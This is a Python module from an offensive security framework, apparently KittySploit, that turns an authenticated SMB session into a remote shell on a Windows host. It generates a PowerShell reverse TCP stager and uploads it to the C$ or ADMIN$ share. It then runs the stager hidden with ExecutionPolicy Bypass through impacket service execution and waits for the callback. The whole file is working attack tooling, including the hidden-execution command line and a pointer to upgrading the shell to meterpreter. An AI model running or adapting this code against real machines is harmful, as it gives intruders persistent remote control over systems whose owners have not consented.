#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Deploy a Windows reverse shell from an SMB session.

Uploads a PowerShell stager to a writable admin share, executes it remotely
via impacket (SCM/PsExec-style), and waits for a callback on a local listener.
"""

import importlib
import os
import tempfile
import time

from kittysploit import *
from core.framework.enums import Platform, SessionType
from core.framework.failure import ProcedureError, FailureType
from lib.exploit.handler import Reverse
from lib.protocols.smb.smb_exec import exec_command, impacket_available
from lib.protocols.smb.smb_session_mixin import SMBSessionMixin


class Module(Post, Reverse, SMBSessionMixin):
    __info__ = {
        "name": "SMB Windows Deploy Reverse Shell",
        "description": (
            "From an authenticated SMB session, upload a PowerShell reverse TCP stager "
            "and execute it remotely to obtain a classic shell session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": SessionType.SMB,
        "references": [],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "chain": {
                "consumes_capabilities": ["authenticated_session"],
                "produces_capabilities": ["shell"],
            },
        },
    }

    lhost = OptString("127.0.0.1", "Callback IP for the reverse shell", True)
    lport = OptPort(4444, "Callback port for the reverse shell", True)
    share = OptString("C$", "Writable admin share for staging (C$, ADMIN$)", False)
    remote_dir = OptString("\\Windows\\Temp", "Remote directory on the share", False)
    remote_name = OptString("ks_stager.ps1", "Remote stager filename", False)
    wait_seconds = OptInteger(8, "Seconds to wait for the reverse callback", False)
    exec_method = OptChoice(
        "auto",
        "Remote execution backend: auto (impacket if available), impacket, upload_only",
        False,
        choices=["auto", "impacket", "upload_only"],
    )

    def check(self):
        sid = str(self.session_id or "").strip()
        if not sid:
            print_error("Session ID is required")
            return False
        if not self.framework or not hasattr(self.framework, "session_manager"):
            print_error("Session manager not available")
            return False
        session = self.framework.session_manager.get_session(sid)
        if not session:
            print_error(f"Session {sid} not found")
            return False
        if str(getattr(session, "session_type", "")).lower() != SessionType.SMB.value:
            print_error("This module requires an SMB session")
            return False
        try:
            self.open_smb()
            return True
        except Exception as e:
            print_error(f"SMB session not usable: {e}")
            return False

    def _load_payload_module(self, import_path: str):
        mod = importlib.import_module(import_path)
        cls = getattr(mod, "Module", None)
        if not cls:
            raise ProcedureError(FailureType.Unknown, f"No Module class in {import_path}")
        return cls(framework=self.framework)

    def _generate_stager_script(self, lhost_val: str, lport_val: int) -> str:
        pl = self._load_payload_module("modules.payloads.singles.cmd.windows.powershell_reverse_tcp")
        pl.set_option("lhost", lhost_val)
        pl.set_option("lport", str(lport_val))
        script = pl._build_script()
        if not script or not isinstance(script, str):
            raise ProcedureError(FailureType.Unknown, "PowerShell payload did not return a script")
        return script.strip()

    def _remote_path(self) -> str:
        share = str(self.share or "C$").strip().strip("\\")
        remote_dir = str(self.remote_dir or "\\Windows\\Temp").strip()
        if not remote_dir.startswith("\\"):
            remote_dir = "\\" + remote_dir
        remote_name = str(self.remote_name or "ks_stager.ps1").strip().strip("\\")
        return share, remote_dir.rstrip("\\") + "\\" + remote_name

    def _windows_path_from_remote(self, share: str, remote_path: str) -> str:
        drive = share.replace("$", ":") if share.endswith("$") else share + ":"
        return drive + remote_path.replace("/", "\\")

    def _validate_windows_admin_share(self, share: str, info: dict) -> bool:
        if share.upper() in {"C$", "ADMIN$"}:
            return True
        print_error(
            "This module deploys a Windows PowerShell stager and expects a writable "
            "admin share such as C$ or ADMIN$."
        )
        print_info(
            f"Current SMB session exposes shares: {', '.join(info.get('shares') or []) or 'unknown'}"
        )
        print_info(
            "For a Linux/Samba share such as public, use post/smb/file/upload_file "
            "or a Linux-specific post module instead."
        )
        return False

    def run(self):
        lhost_val = str(self.lhost).strip()
        lport_val = int(self.lport)
        wait_s = int(self.wait_seconds or 8)
        method = str(self.exec_method or "auto").lower()

        if method == "auto":
            method = "impacket" if impacket_available() else "upload_only"

        if method == "impacket" and not impacket_available():
            print_warning("impacket not installed — falling back to upload_only")
            print_info("Install impacket for remote execution: pip install impacket")
            method = "upload_only"

        info = self.get_smb_connection_info()
        host = str(info.get("host") or "")
        username = str(info.get("username") or "")
        password = str(info.get("password") or "")
        domain = str(info.get("domain") or "")
        port = int(info.get("port") or 445)

        print_status(f"Generating PowerShell reverse stager -> {lhost_val}:{lport_val}")
        stager_script = self._generate_stager_script(lhost_val, lport_val)

        share, remote_path = self._remote_path()
        if not self._validate_windows_admin_share(share, info):
            return False

        windows_path = self._windows_path_from_remote(share, remote_path)
        print_info(f"Remote staging path: \\\\{host}\\{share}{remote_path}")

        with tempfile.NamedTemporaryFile("w", suffix=".ps1", delete=False, encoding="utf-8") as tmp:
            tmp.write(stager_script + "\n")
            local_stager = tmp.name

        try:
            client = self.open_smb()
            print_status("Uploading stager over SMB...")
            if not client.put_file(share, local_stager, remote_path):
                raise ProcedureError(FailureType.Unknown, f"Failed to upload stager to {share}:{remote_path}")
            print_success("Stager uploaded")
        finally:
            try:
                os.unlink(local_stager)
            except OSError:
                pass

        exec_cmd = (
            f'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{windows_path}"'
        )

        if method == "upload_only":
            print_warning("Remote execution skipped (upload_only / impacket unavailable)")
            print_info(f"Run manually on the target if you have another channel:\n  {exec_cmd}")
            return True

        print_status("Starting reverse TCP listener...")
        if not self.start_handler():
            raise ProcedureError(FailureType.Unknown, "Could not start reverse TCP listener")
        time.sleep(1.0)

        print_status("Executing stager remotely via SMB/SCM...")
        try:
            exec_command(
                host=host,
                username=username,
                password=password,
                domain=domain,
                port=port,
                command=exec_cmd,
            )
        except ImportError as e:
            raise ProcedureError(FailureType.Unknown, str(e))
        except Exception as e:
            raise ProcedureError(FailureType.Unknown, f"Remote execution failed: {e}")

        print_info(f"Waiting up to {wait_s}s for reverse callback...")
        time.sleep(max(1, wait_s))
        print_success("If the stager ran successfully, a new shell session should appear in `sessions`.")
        print_info("Use `post/shell/windows/manage/upgrade_shell_to_meterpreter` to upgrade the new shell.")
        return True
